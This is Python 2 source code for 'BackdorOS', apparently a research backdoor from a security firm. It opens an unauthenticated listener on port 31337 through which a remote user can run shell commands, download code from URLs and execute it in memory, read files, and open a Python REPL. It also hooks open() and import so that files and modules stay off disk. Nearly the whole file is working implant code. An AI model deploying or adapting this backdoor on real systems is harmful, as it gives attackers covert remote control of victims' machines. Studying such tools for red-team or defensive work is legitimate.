#!/usr/bin/env python2.7
#
# Copyright (c) 2019, SafeBreach
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without
# modification, are permitted provided that the following conditions are
# met:
#
#  1. Redistributions of source code must retain the above
# copyright notice, this list of conditions and the following
# disclaimer.
#
#  2. Redistributions in binary form must reproduce the
# above copyright notice, this list of conditions and the following
# disclaimer in the documentation and/or other materials provided with
# the distribution.
#
#  3. Neither the name of the copyright holder
# nor the names of its contributors may be used to endorse or promote
# products derived from this software without specific prior written
# permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS
# AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
# GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER
# IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR
# OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
# ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

import sys
import socket
import imp
import asyncore
import StringIO
import platform
import urllib2
import asynchat
import warnings
import datetime
import subprocess
import getpass
import os
import shlex
import multiprocessing
import code

# i.e. foobar.py:1: RuntimeWarning: Parent module 'foobar' not found while handling absolute import
warnings.filterwarnings("ignore")


####################
# Global Variables #
####################

_mem_storage = {}
_mem_storage_size = 0
_is_alive = True
_start_date = datetime.datetime.now().replace(microsecond=0)
_is_debug = False
__version__ = "0.1.0"
__author__ = "Itzik Kotler"
__copyright__ = "Copyright 2019, SafeBreach"


###########
# Classes #
###########

# TODO: Replace this implementation; this just a simple cross-platform hack (asyncore.file_dispatcher? only available on UNIX)

class IOProxy(object):
    def __init__(self, proxy, prefix=''):
        self._proxy = proxy
        self._prefix = prefix

    def write(self, str):
        # Special Char?
        if str == '\n' or str == '\t' or str == '\r':
            self._proxy.push(str)
        else:
            self._proxy.push('%s: %s' % (self._prefix, str))


class VirtualFile(StringIO.StringIO):
    def __init__(self, *args, **kwargs):
        StringIO.StringIO.__init__(self, *args, **kwargs)
        self.__total_size = 0

    def read(self, *args, **kwargs):
        _size = None

        try:
            _size = kwargs.get('size', args[0])
        except IndexError:
            pass

        return self.getvalue()[:_size]

    # https://docs.python.org/2/library/stdtypes.html#bltin-file-objects Says file.write(str)
    def write(self, str):
        global _mem_storage_size
        StringIO.StringIO.write(self, str)
        self.__total_size += len(str)
        _mem_storage_size += self.__total_size

    def close(self, force=False):
        global _mem_storage_size
        if force:
            _mem_storage_size -= self.__total_size
            StringIO.StringIO.close(self)

    def getsize(self):
        return self.__total_size

    def __exit__(self, type , value , traceback):
        return None

    def __enter__(self):
        return self


class ShellHandler(asynchat.async_chat):
    def __init__(self, *args, **kwargs):
        asynchat.async_chat.__init__(self, *args, **kwargs)
        self._childs = {}
        self._in_repl = False
        self._repl_instance = code.InteractiveConsole()
        self._stdout = None
        self._stderr = None
        self._in_cat = False
        self._in_cat_buffer = ""
        self._in_cat_filename = ""
        self.buffer = ""
        self.set_terminator('\n')
        # Welcome to the Jungle!
        self.push("BackdorOS release %s on an %s\n" % (__version__, platform.platform()))
        self.push("%> ")

    def collect_incoming_data(self, data):
        self.buffer += data

    def found_terminator(self):
        if self.buffer:
            self.parse(self.buffer + '\n')
        self.buffer = ""

    #########################
    # BackdorOS Basic Shell #
    #########################

    _COMMANDS = {
        "WRITE": {"DESC": "write file to mem", "USAGE": "[-|url] [filename]", "ARGC": 2},
        "READ": {"DESC": "read file from mem/disk", "USAGE": "[path]", "ARGC": 1},
        "DELETE": {"DESC": "delete file from mem", "USAGE": "[filename]", "ARGC": 1},
        "DIR": {"DESC": "list all files on mem"},
        "PYGO": {"DESC": "start python program from mem/disk", "USAGE": "[progname|progname.funcname] [args ...]", "ARGC": 1},
        "PPYGO": {"DESC": "like PYGO but run as a separate process", "USAGE": "[progname|progname.funcname] [args ...]", "ARGC": 1},
        "PYEXECFILE": {"DESC": "exec python program from mem/disk", "USAGE": "[filename]", "ARGC": 1},
        "HELP": {"DESC": "print this screen"},
        "REBOOT": {"DESC": "stopping and restarting the system"},
        "SHUTDOWN": {"DESC": "close down the system"},
        "QUIT": {"DESC": "close this session"},
        "UPTIME": {"DESC": "print how long the system has been running"},
        "SHEXEC": {"DESC": "execute system command and print the output", "USAGE": "[command]", "ARGC": 1},
        "PSHEXEC": {"DESC": "like SHEXEC but run as a separate process", "USAGE": "[command]", "ARGC": 1},
        "PJOINALL": {"DESC": "join all child processes with timeout of 1 sec"},
        "PLIST": {"DESC": "list all child processes"},
        "DEBUG": {"DESC": "toggle debug mode", "USAGE": "[true|false|status]", "ARGC": 1},
        "PYREPL": {"DESC": "python in-memory REPL"},
        "CLS": {"DESC": "attempt to clear the screen"}
    }

    def _do_CLS(self, params):
        for i in xrange(0, 80):
            self.push('\n')

    def _do_HELP(self, params):
        output = ""
        self.push("BackdorOS release %s on an %s\n" % (__version__, platform.platform()))
        self.push("These commands are defined internally. Type `help' to see this list.\n\n")
        for cmd in self._COMMANDS.keys():
            output += "%-50s%s\n" % (self._COMMANDS[cmd]['DESC'], cmd + ' ' + self._COMMANDS[cmd].get('USAGE', ''))
        self.push(output)

    def _do_WRITE(self, params):
        # 'WRITE - foobar.py'
        if params[0] == '-':
            self.push("WRITE: Saving to mem file <%s> until you type 'EOF'\n" % params[1])
            self._in_cat = True
            self._in_cat_buffer = ""
            self._in_cat_filename = params[1]

        else:
            output_data = ""

            # Callback from 'EOF' for 'WRITE - foobar.py'
            if params[0] == '+':
                output_data = self._in_cat_buffer
                self._in_cat = False
                self._in_cat_buffer = ""
                self._in_cat_filename = ""

            # 'WRITE http://site/foobar.py foobar.py'
            else:
                output_data = urllib2.urlopen(params[0]).read()

            f = open(params[1], 'w')
            f.write(output_data)
            f.close()
            self.push("WRITE: Saved (%d bytes) to mem file <%s>\n" % (len(output_data), params[1]))

    def _do_READ(self, params):
        self.push(open(params[0], 'r').read())

    def _do_DELETE(self, params):
        global _mem_storage
        if _mem_storage.has_key(params[0]):
            self.push("DELETE: Removing mem file %s ..." % params[0])
            try:
                _mem_storage[params[0]].close(force=True)
                del _mem_storage[params[0]]
            except KeyError:
                self.push("DELETE: Unable to find mem file %s" % params[0])

    def _do_DIR(self, params):
        global _mem_storage
        global _mem_storage_size
        output = "DIR: There are %d file(s) that sums to %d byte(s) of memory\n" % (len(_mem_storage.keys()), _mem_storage_size)
        if _mem_storage_size > 0:
            output += "\nFILENAME           | SIZE       | MEMORY ADDRESS\n"
            output += '-' * 48 + '\n'
            for entry in _mem_storage.keys():
                output += "%-20s %-12s 0x%x\n" % (entry, _mem_storage[entry].getsize(), id(_mem_storage[entry]))
        self.push(output)

    def _do_PYEXECFILE(self, params):
        self.push("Calling %s\n" % (params[0]))
        # Redirect I/O
        self._stdout = sys.stdout
        sys.stdout = IOProxy(self, prefix=params[0].upper())
        exec(open(params[0], 'r').read())
        # Restore I/O
        sys.stdout = self._stdout

    def _PYGO_imp(self, params):
        global _mem_storage
        mod_name = params[0]
        mod_entrypoint = "main"
        mod_argv = [mod_name + '.py'] + params[1:]

        try:
            (mod_name, mod_entrypoint) = params[0].split('.')
        except ValueError:
            pass

        self.push("Calling %s.%s with argc: %d and argv: %s\n" % (mod_name, mod_entrypoint, len(mod_argv)-1, repr(mod_argv)))
        mod = __import__(mod_name)
        # Redirect I/O
        self._stdout = sys.stdout
        sys.stdout = IOProxy(self, prefix=mod_name.upper())
        retval = getattr(mod, mod_entrypoint)(len(mod_argv), mod_argv)
        # Restore I/O
        sys.stdout = self._stdout
        self.push("%s.%s: RETURN VALUE = %s" % (mod_name, mod_entrypoint, str(retval)))

    def _do_PYGO(self, params):
        return self._PYGO_imp(params)

    def _do_PPYGO(self, params):
        p = multiprocessing.Process(target=self._PYGO_imp, args=(params,))
        p.start()
        self._childs[p.pid] = (p, params)
        print "### START CHILD PROCESS <PID: %d> ###" % p.pid

    def _do_REBOOT(self, params):
        raise asyncore.ExitNow('Server is rebooting!')

    def _do_SHUTDOWN(self, params):
        global _is_alive
        _is_alive = False
        raise asyncore.ExitNow('Server is quitting!')

    def _do_QUIT(self, params):
        self.push('Bye!\n')
        self.close()

    def _do_UPTIME(self, params):
        global _start_date
        self.push('UPTIME: Up %s' % str(datetime.datetime.now().replace(microsecond=0)-_start_date))

    def _SHEXEC_imp(self, params):
        self.push(getpass.getuser() + '@' + socket.gethostname() + ':' + os.getcwd() + '> ' + ' '.join(params) + '\n')
        self.push(subprocess.check_output(params))

    def _do_SHEXEC(self, params):
        return self._SHEXEC_imp(params)

    def _do_PJOINALL(self, params):
        _oldlen = len(self._childs)
        for k, v in self._childs.items():
            p = v[0]
            res = p.join(1)
            if p.exitcode is not None:
                print "### JOINED CHILD PROCESS <PID: %d> ###" % p.pid
                del self._childs[k]
        self.push("JOINED %d PROCESSES" % (_oldlen - len(self._childs)))

    def _do_PLIST(self, params):
        self.push('CHILD PROCESSES\n' + '-' * 15 + '\n\n')
        for k, v in self._childs.items():
            self.push('PID #%-8d %s = %s\n' % (k, v[0], v[1]))
        if len(self._childs.items()) != 0:
            self.push('\n')
        self.push('TOTAL: %d' % (len(self._childs)))

    def _do_PSHEXEC(self, params):
        p = multiprocessing.Process(target=self._SHEXEC_imp, args=(params,))
        p.start()
        self._childs[p.pid] = (p, params)
        print "### START CHILD PROCESS <PID: %d> ###" % p.pid

    def _do_DEBUG(self, params):
        global _is_debug

        val = params[0].upper()

        if val == 'TRUE':
            _is_debug = True
        elif val == 'FALSE':
            _is_debug = False
        else:
            # Assume 'STATUS'
            pass

        print "DEBUG equal to %s" % _is_debug

    def _do_PYREPL(self, params):
        # SOURCE: https://github.com/python/cpython/blob/e42b705188271da108de42b55d9344642170aa2b/Lib/code.py
        cprt = 'Type "help", "copyright", "credits" or "license" for more information.'
        self.push("=== PYREPL START ===\nPython %s on %s\n%s\n" % (sys.version, sys.platform, cprt))

        try:
            sys.ps1
        except AttributeError:
            sys.ps1 = ">>> "

        try:
            sys.ps2
        except AttributeError:
            sys.ps2 = "... "

        self.push(sys.ps1)

        # Redirect STDOUT & STDERR
        self._stdout = sys.stdout
        sys.stdout = IOProxy(self, prefix="STDOUT")
        self._stderr = sys.stderr
        sys.stderr = IOProxy(self, prefix="STDERR")

        self._in_repl = True

    def parse(self, data):
        # In Edit/Insertion Mode?
        if self._in_cat:
            self._in_cat_buffer += data
            eof_idx = self._in_cat_buffer.find('EOF')
            if eof_idx != -1:
                # Remove "EOF" (3 bytes) from Buffer
                self._in_cat_buffer = self._in_cat_buffer[:eof_idx]
                self._do_WRITE(['+', self._in_cat_filename])
        elif self._in_repl:
            if data.startswith('exit()'):
                self.push("=== PYREPL END ===")
                self._in_repl = False
                # Restore STDOUT and STDERR
                stdout = self._stdout
                stderr = self._stderr
            else:
                more = self._repl_instance.push(data)
                if more:
                    self.push(sys.ps2)
                else:
                    self.push(sys.ps1)
        # In General Mode
        else:
            if not data == '\r\n' and not data == '\n':
                # '!' is alias for 'SHEXEC'
                if data[0] == '!':
                    data = 'SHEXEC ' + data[1:]
                # '?' is alias for 'HELP'
                if data[0] == '?':
                    data = 'HELP'
                # 0x4 (EOT) equal 'QUIT'
                if ord(data[0]) == 4:
                    data = 'QUIT'
                # Data
                cmd_params = shlex.split(data)
                cmd_name = cmd_params[0].upper()
                if self._COMMANDS.has_key(cmd_name):
                    # Exclude CMD_NAME count when checking CMD_NAME's ARGC
                    if len(cmd_params)-1 >= self._COMMANDS[cmd_name].get('ARGC', 0):
                        try:
                            cmd_line = 'self._do_%s(%s)' % (cmd_name, repr(cmd_params[1:]))
                            eval(cmd_line)
                        except asyncore.ExitNow as e:
                            self.push("KERNEL: %s\n" % str(e))
                            raise e
                        except Exception as e:
                            self.push("%s: %s" % (cmd_name, str(e)))
                    else:
                        self.push("%s: Not enough parameters" % cmd_name)
                else:
                    self.push("KERNEL: Unknown command: %s " % cmd_name)

        # Still In Edit/Insertion Mode?
        if self._in_cat:
            self.push('')
        elif self._in_repl:
            # Priting sys.ps1 or sys.ps2 is done within in_repl logic
            pass
        else:
            self.push('\n%> ')


class ShellServer(asyncore.dispatcher):
    def __init__(self, host='', port=31337):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            sock, addr = pair
            handler = ShellHandler(sock)


###################
# Monkey patching #
###################

_real_open = __builtins__.open


def _open(*args, **kwargs):
    global _is_debug
    global _mem_storage

    if _is_debug:
        print "*** HOOKED *** OPEN: args = %s, kwargs = %s" % (args, kwargs)

    name = args[0]
    mode = 'r'

    try:
        # i.e. open('foobar', mode='r') or open('foobar', 'r')
        mode = kwargs.get('mode', args[1])

    except IndexError:
        # If mode is omitted, it defaults to 'r'.
        pass

    if mode == 'r' or mode.startswith('r'):
        if _mem_storage.has_key(name):
            # It's a previously created virtual file
            return _mem_storage[name]
        # It's a real file
        return _real_open(*args, **kwargs)

    # Create a new virtual file
    _mem_storage[name] = VirtualFile()
    return _mem_storage[name]


__builtins__.open = _open

_real_import = __builtins__.__import__


def __import__(*args, **kwargs):
    global _is_debug

    if _is_debug:
        print "*** HOOKED *** IMPORT: args = %s, kwargs = %s" % (args, kwargs)

    name = args[0]

    try:
        return _real_import(*args, **kwargs)
    except ImportError:
        # TODO: Add support for more extensions? (e.g. *.pyc)
        if _mem_storage.has_key(args[0] + '.py'):
            name = args[0] + '.py'
        if _mem_storage.has_key(name):
            # It's a Virtual File!
            new_mod = imp.new_module(name)
            exec _mem_storage[name].read() in new_mod.__dict__
            sys.modules[args[0]] = new_mod
            return new_mod
        else:
            # It's a bust!
            raise ImportError('ImportError: No module named %s' % name)


# TODO: Monkey patch https://docs.python.org/2/library/os.html#file-descriptor-operations

while _is_alive:
    try:
        ShellServer()
        asyncore.loop()
    except asyncore.ExitNow:
        pass
